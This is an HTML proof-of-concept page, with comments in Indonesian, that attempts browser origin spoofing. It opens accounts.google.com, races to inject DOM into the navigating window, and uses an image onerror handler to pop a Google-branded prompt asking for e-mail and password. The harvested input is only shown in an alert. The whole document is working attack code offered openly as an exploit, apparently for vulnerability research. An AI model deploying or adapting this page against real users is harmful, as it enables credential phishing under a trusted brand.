<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spoofing PoC - Combined</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      font-family: sans-serif;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <button onclick="executeSpoof()">Start Test</button>

  <script>
    function executeSpoof() {
      // 1. Menggunakan _top / window.open dengan path spesifik untuk menghindari Universal Links
      let win = window.open('https://accounts.google.com/', '_top');

      // 2. Race Condition: Injeksikan DOM sebelum navigasi cross-origin diselesaikan penuh oleh browser
      setTimeout(() => {
        try {
          win.document.write(`
            <body style="margin:0; padding:20px; text-align:center;">
              <h2>Loading Google Services...</h2>
              <!-- 3. Injeksi Image Onerror untuk memicu prompt modal tanpa origin attribution -->
              <img src="" onerror="
                setTimeout(function() {
                  let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
                  if (user) {
                    alert('Captured Credentials: ' + user);
                  }
                }, 100);
              ">
            </body>
          `);
          win.document.close();
        } catch (e) {
          console.warn("Cross-Origin restriction enforced:", e);
        }
      }, 50);
    }
  </script>

</body>
</html>
